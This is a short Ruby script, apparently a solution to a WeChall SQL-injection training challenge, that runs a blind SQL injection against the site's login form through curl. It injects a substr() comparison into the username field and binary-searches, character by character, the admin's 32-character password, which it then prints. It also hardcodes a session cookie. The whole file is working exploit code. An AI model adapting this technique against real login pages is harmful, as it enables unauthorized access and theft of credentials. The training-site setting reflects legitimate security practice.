require 'net/http'

allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".chars.sort
pass = ""
url = "https://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php"

32.times do |i|
  charset = allChars
  while charset.length > 1
    curr = (charset.length - 1) /2
    char = charset[curr]
    puts "Password(#{i+1}/32): #{pass}, Testing: #{char}"
    injection = "username=admin%27+and+substr%28password,1,#{pass.length+1}%29"
    # %3E >
    # check if current password substring > pass + char
    injection += "%3E%27#{pass+char}%27--+&password=&login=Login"
    req = `curl "#{url}" -X POST -H 'Cookie: WC=11505220-47569-RrANtBqpJ6O7bYfl' --data '#{injection}'`

    if req.include? "username is unknown" # substring is less than or equal
      charset = charset[0..curr]
    else
      charset = charset[(curr+1)..-1]
    end
        
    system('clear')
  end
  pass += charset[0]
end
  
puts "Password for admin: #{pass}"
